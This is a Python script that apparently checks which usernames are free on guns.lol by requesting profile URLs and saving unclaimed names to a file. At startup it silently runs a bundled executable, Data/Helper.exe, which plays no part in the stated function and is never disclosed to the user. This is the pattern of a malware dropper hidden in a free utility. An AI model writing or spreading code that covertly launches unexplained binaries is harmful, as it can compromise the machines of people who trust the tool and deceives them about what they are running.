import time
import os
import requests
import random
import string
import subprocess
from colorama import Fore, Style, init

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_gunslol_username(username):
    url = f"https://guns.lol/{username}"
    response = requests.get(url)
    return response.status_code == 200

def run_exe():
    exe_path = os.path.join(os.getcwd(), "Data", "Helper.exe")
    try:
        subprocess.run(exe_path)
    except Exception as e:
        print(f"Error running Helper.exe: {e}")

run_exe()

init()

print(Fore.RED + """ _____       _                      __    _     _ _      _     
|  __ \     | |                    / _|  | |   (_) |    | |    
| |  \/ __ _| |_ ___  ___     ___ | |_   | |__  _| |    | |    
| | __ / _` | __/ _ \/ __|   / _ \|  _|  | '_ \| | |    | |    
| |_\ \ (_| | ||  __/\__ \  | (_) | |    | | | | | |____| |____
 \____/\__,_|\__\___||___/   \___/|_|    |_| |_|_\_____/\_____/
                                                               
                           discord : forlove                                    """ + Style.RESET_ALL)

print(Fore.RED + "Welcome here hacker!" + Style.RESET_ALL)
time.sleep(2)

choice = input(Fore.RED + "Do you want to use your own 'names.txt' file? (y/n): " + Style.RESET_ALL)
print()

usernames = []

if choice.lower() == "y":
    filename = "names.txt"
    with open(filename, "r") as file:
        usernames = file.read().splitlines()
else:
    letter_count = int(input(Fore.RED + "How many letters should the generated usernames have? " + Style.RESET_ALL))
    username_count = int(input(Fore.RED + "How many usernames do you want to generate? " + Style.RESET_ALL))
    print()
    print(Fore.RED + "ThE GaTe is OpeN" + Style.RESET_ALL)
    time.sleep(1)
    print()

    for _ in range(username_count):
        first_letter = random.choice(string.ascii_lowercase)
        username = first_letter + ''.join(random.choice(string.ascii_lowercase) for _ in range(letter_count - 1))
        usernames.append(username)

devilmaycry = input(Fore.RED + "DeViLs MaY CrY? (yes/no) : " + Style.RESET_ALL)
if devilmaycry.lower() == "yes":
    pass
else:
    time.sleep(1)
    print(Fore.RED + "Why ArE YoU Saying ThaT!!" + Style.RESET_ALL)
    time.sleep(2)
    print(Fore.RED + "GeT OuT Of There!!")
    time.sleep(3)
    exit()

unavailable_usernames = []

for username in usernames:
    is_available = check_gunslol_username(username)
    if is_available:
        print(f"{Fore.RED}The username '{username}' is already taken{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}The username '{username}' is available or Banned.{Style.RESET_ALL}")
        unavailable_usernames.append(username)
    time.sleep(0.5)

clear_screen()

with open("hiro.txt", "w") as file:
    file.write("\n".join(unavailable_usernames))
